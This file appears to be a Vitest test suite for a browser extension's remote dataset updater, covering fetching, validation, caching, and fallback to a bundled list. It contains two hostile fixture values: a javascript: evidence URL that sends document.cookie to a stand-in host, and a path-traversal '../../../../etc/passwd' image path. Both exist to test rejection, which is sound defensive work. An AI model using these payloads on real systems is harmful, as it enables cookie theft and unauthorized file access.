/*
 * The update flow, end to end: fetch → validate → gate → cache → what `getSites()` hands
 * back afterwards.
 *
 * The interesting cases are all failures. A dataset that downloads and applies cleanly is
 * one path; the other dozen are a server that is down, a file that is malformed, a file
 * that is hostile, a file that is older than what is already installed, and a file written
 * against a schema this build cannot read. Every one of them has to leave the extension
 * with a working list, because a list one week stale is worth incomparably more than none.
 */
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import {
  CACHE_KEY,
  bundled,
  getDataset,
  getSites,
  isUsable,
  readRecord,
  type UpdateRecord,
} from '../src/lib/dataset.ts'
import { DATASET_URL, TTL_MS, getUpdateState, refreshIfStale, refreshNow } from '../src/lib/remote.ts'
import type { Dataset } from '../src/types.ts'
import { installChromeMock, makeSite, uninstallChromeMock } from './helpers.ts'

let mock: ReturnType<typeof installChromeMock>
let fetchMock: ReturnType<typeof vi.fn>

beforeEach(() => {
  mock = installChromeMock()
  fetchMock = vi.fn()
  globalThis.fetch = fetchMock as unknown as typeof fetch
})

afterEach(() => {
  uninstallChromeMock()
  vi.restoreAllMocks()
  vi.useRealTimers()
})

/**
 * A dataset shaped exactly like the bundled one, one revision newer, with a marker site
 * that could not have come from the bundle.
 */
function newerDataset(overrides: Partial<Dataset> = {}): Dataset {
  return {
    ...bundled,
    revision: bundled.revision + 1,
    sites: [...bundled.sites, makeSite({ domain: 'fetched-only.co.il', name: 'נוסף בעדכון' })],
    ...overrides,
  }
}

function response(
  body: unknown,
  { status = 200, etag = 'W/"abc"', raw }: { status?: number; etag?: string | null; raw?: string } = {},
): unknown {
  const text = raw ?? JSON.stringify(body)
  return {
    ok: status >= 200 && status < 300,
    status,
    headers: {
      get: (name: string) =>
        name.toLowerCase() === 'etag' ? etag : name.toLowerCase() === 'content-length' ? String(text.length) : null,
    },
    text: async () => text,
  }
}

function storedRecord(): UpdateRecord | undefined {
  return mock.local[CACHE_KEY] as UpdateRecord | undefined
}

/** Put a known-good fetched list in the cache, the way a previous successful run would. */
async function seedCache(dataset: Dataset = newerDataset(), etag = 'W/"seed"'): Promise<void> {
  fetchMock.mockResolvedValueOnce(response(dataset, { etag }))
  await refreshNow()
  fetchMock.mockReset()
}

describe('a successful update', () => {
  it('applies a newer, valid list and serves it from getSites()', async () => {
    fetchMock.mockResolvedValueOnce(response(newerDataset()))

    const state = await refreshNow()

    expect(state.source).toBe('remote')
    expect(state.revision).toBe(bundled.revision + 1)
    expect(state.lastError).toBeNull()

    const sites = await getSites()
    expect(sites.map((site) => site.domain)).toContain('fetched-only.co.il')
    expect(sites.length).toBe(bundled.sites.length + 1)
  })

  it('fetches the file on main, and requests no permission to do it', async () => {
    fetchMock.mockResolvedValueOnce(response(newerDataset()))
    await refreshNow()

    const [url, init] = fetchMock.mock.calls[0] as [string, RequestInit]
    expect(url).toBe(DATASET_URL)
    expect(url.startsWith('https://')).toBe(true)
    // Cross-origin only works here because the host answers with `access-control-allow-origin: *`.
    // Sending credentials would be both pointless and a tracking vector.
    expect(init.credentials).toBe('omit')
  })

  it('records the etag and replays it as If-None-Match next time', async () => {
    await seedCache(newerDataset(), 'W/"first"')
    expect(storedRecord()?.etag).toBe('W/"first"')

    fetchMock.mockResolvedValueOnce(response(null, { status: 304 }))
    await refreshNow()

    const [, init] = fetchMock.mock.calls[0] as [string, RequestInit]
    expect((init.headers as Record<string, string>)['If-None-Match']).toBe('W/"first"')
  })

  it('keeps the cached list on a 304 and only moves the checked timestamp', async () => {
    await seedCache()
    const before = storedRecord()!

    fetchMock.mockResolvedValueOnce(response(null, { status: 304 }))
    await refreshNow()

    const after = storedRecord()!
    expect(after.dataset).toEqual(before.dataset)
    expect(after.fetchedAt).toBe(before.fetchedAt)
    expect(after.checkedAt).toBeGreaterThanOrEqual(before.checkedAt!)
    expect(after.lastError).toBeNull()
  })

  it('clears a previous error once a check succeeds again', async () => {
    fetchMock.mockRejectedValueOnce(new Error('network down'))
    await refreshNow()
    expect((await getUpdateState()).lastError).toBe('network down')

    fetchMock.mockResolvedValueOnce(response(newerDataset()))
    expect((await refreshNow()).lastError).toBeNull()
  })
})

describe('a rejected update leaves the working list alone', () => {
  it('refuses a different schema major and says the extension is too old', async () => {
    fetchMock.mockResolvedValueOnce(response(newerDataset({ schema_version: '2.0' })))

    const state = await refreshNow()

    expect(state.source).toBe('bundled')
    expect(state.lastError).toContain('newer extension')
    expect(await getSites()).toEqual(bundled.sites)
  })

  it.each([
    ['an equal revision', 0],
    ['a lower revision', -1],
  ])('ignores %s without calling it an error', async (_label, delta) => {
    const stale = newerDataset({ revision: bundled.revision + delta })
    fetchMock.mockResolvedValueOnce(response(stale))

    const state = await refreshNow()

    expect(state.source).toBe('bundled')
    expect(state.revision).toBe(bundled.revision)
    // Not a fault: the server is simply serving what this install already has.
    expect(state.lastError).toBeNull()
  })

  it('refuses a body that is not JSON', async () => {
    fetchMock.mockResolvedValueOnce(response(null, { raw: '<html>504 Gateway Timeout</html>' }))

    const state = await refreshNow()

    expect(state.source).toBe('bundled')
    expect(state.lastError).toBeTruthy()
  })

  it('refuses a list carrying a javascript: evidence URL', async () => {
    // The banner assigns this to `link.href` inside the host page. Nothing downstream of
    // here re-checks it, so this rejection is the whole defence.
    const hostile = newerDataset({
      sites: [makeSite({ evidence_url: 'javascript:fetch("//evil.example/"+document.cookie)' })],
    })
    fetchMock.mockResolvedValueOnce(response(hostile))

    const state = await refreshNow()

    expect(state.source).toBe('bundled')
    expect(state.lastError).toContain('evidence_url')
    expect(await getSites()).toEqual(bundled.sites)
  })

  it('refuses a list whose proof_image escapes the proof folder', async () => {
    const hostile = newerDataset({
      sites: [makeSite({ proof_image: '../../../../etc/passwd' })],
    })
    fetchMock.mockResolvedValueOnce(response(hostile))

    expect((await refreshNow()).lastError).toContain('proof_image')
  })

  it.each([500, 404, 403])('refuses HTTP %s', async (status) => {
    fetchMock.mockResolvedValueOnce(response(null, { status }))

    const state = await refreshNow()

    expect(state.source).toBe('bundled')
    expect(state.lastError).toContain(String(status))
  })

  it('survives the fetch rejecting outright', async () => {
    fetchMock.mockRejectedValueOnce(new TypeError('Failed to fetch'))

    const state = await refreshNow()

    expect(state.source).toBe('bundled')
    expect(state.lastError).toContain('Failed to fetch')
  })

  it('reports a timeout as a timeout, not as "the user aborted a request"', async () => {
    const aborted = new Error('The user aborted a request.')
    aborted.name = 'AbortError'
    fetchMock.mockRejectedValueOnce(aborted)

    expect((await refreshNow()).lastError).toContain('timed out')
  })

  /*
   * Regression: `refreshNow` used to write back a record it had captured *before* the
   * request. A list stored during the round-trip — by the options page's "check now"
   * button, or by the worker's own scheduled check — was silently replaced by whatever
   * had been current when the losing check started. Found by an e2e test whose seeded
   * cache kept vanishing.
   */
  it('does not clobber a list stored while the request was in flight', async () => {
    const winner = { ...newerDataset(), revision: bundled.revision + 9 }

    fetchMock.mockImplementationOnce(async () => {
      // Someone else finishes first, while this request is still open.
      mock.local[CACHE_KEY] = {
        dataset: winner,
        fetchedAt: Date.now(),
        checkedAt: Date.now(),
        etag: 'W/"winner"',
        lastError: null,
      }
      return response(null, { status: 304 })
    })

    await refreshNow()

    expect((await getUpdateState()).revision).toBe(bundled.revision + 9)
  })

  it('does not clobber a newer stored list when its own payload is older', async () => {
    const winner = { ...newerDataset(), revision: bundled.revision + 9 }

    fetchMock.mockImplementationOnce(async () => {
      mock.local[CACHE_KEY] = {
        dataset: winner,
        fetchedAt: Date.now(),
        checkedAt: Date.now(),
        etag: null,
        lastError: null,
      }
      return response(newerDataset())
    })

    await refreshNow()

    // The in-flight payload is revision+1; what landed meanwhile is revision+9.
    expect((await getUpdateState()).revision).toBe(bundled.revision + 9)
  })

  it('keeps a list it already had when a later check fails', async () => {
    await seedCache()
    expect((await getUpdateState()).source).toBe('remote')

    fetchMock.mockRejectedValueOnce(new Error('network down'))
    const state = await refreshNow()

    // The whole point: a failing check must never cost the user the list they had.
    expect(state.source).toBe('remote')
    expect(state.lastError).toBe('network down')
    expect((await getSites()).map((site) => site.domain)).toContain('fetched-only.co.il')
  })
})

describe('the cached list versus the bundled one', () => {
  it('drops a cached list the shipped one has caught up with', async () => {
    // What an extension update looks like from the cache's point of view: same file, but
    // the build now carries a revision at least as high.
    await writeCachedRecord({ ...newerDataset(), revision: bundled.revision })
    expect(isUsable((await readRecord()).dataset)).toBe(false)
    expect(await getDataset()).toEqual(bundled)
  })

  it('drops a cached list written against a schema major this build cannot read', async () => {
    await writeCachedRecord(newerDataset({ schema_version: '2.0' }))
    expect(await getDataset()).toEqual(bundled)
  })

  it('falls back to the bundled list when storage holds nothing', async () => {
    expect(await getDataset()).toEqual(bundled)
    expect(await getSites()).toEqual(bundled.sites)
  })

  it('falls back to the bundled list when storage holds junk', async () => {
    mock.local[CACHE_KEY] = 'not a record'
    expect(await getDataset()).toEqual(bundled)
  })

  it('falls back to the bundled list when storage throws', async () => {
    chrome.storage.local.get = vi.fn().mockRejectedValue(new Error('context invalidated'))
    expect(await getDataset()).toEqual(bundled)
  })
})

describe('scheduling', () => {
  it('does not touch the network when the user has updates off', async () => {
    mock.store['autoUpdate'] = false

    await refreshIfStale()

    expect(fetchMock).not.toHaveBeenCalled()
  })

  it('checks on a fresh install, which has never checked at all', async () => {
    fetchMock.mockResolvedValueOnce(response(newerDataset()))

    await refreshIfStale()

    expect(fetchMock).toHaveBeenCalledTimes(1)
  })

  it('does nothing when a check is not yet due', async () => {
    await seedCache()

    await refreshIfStale()

    // This is what makes it safe to call from every tab event: one storage read.
    expect(fetchMock).not.toHaveBeenCalled()
  })

  it('checks again once the TTL has passed', async () => {
    await seedCache()

    vi.useFakeTimers()
    vi.setSystemTime(Date.now() + TTL_MS + 1000)

    fetchMock.mockResolvedValueOnce(response(newerDataset({ revision: bundled.revision + 5 })))
    await refreshIfStale()

    expect(fetchMock).toHaveBeenCalledTimes(1)
    expect((await getUpdateState()).revision).toBe(bundled.revision + 5)
  })

  it('re-checks after a failure rather than retrying in a loop', async () => {
    fetchMock.mockRejectedValueOnce(new Error('network down'))
    await refreshIfStale()
    expect(fetchMock).toHaveBeenCalledTimes(1)

    // A failed check still moves `checkedAt`: the TTL is a rate limit on attempts, not on
    // successes, or an outage would mean one request per tab event.
    await refreshIfStale()
    expect(fetchMock).toHaveBeenCalledTimes(1)
  })
})

/** Write a record straight to storage, bypassing the fetch path. */
async function writeCachedRecord(dataset: Dataset): Promise<void> {
  const record: UpdateRecord = {
    dataset,
    fetchedAt: Date.now(),
    checkedAt: Date.now(),
    etag: null,
    lastError: null,
  }
  mock.local[CACHE_KEY] = record
}
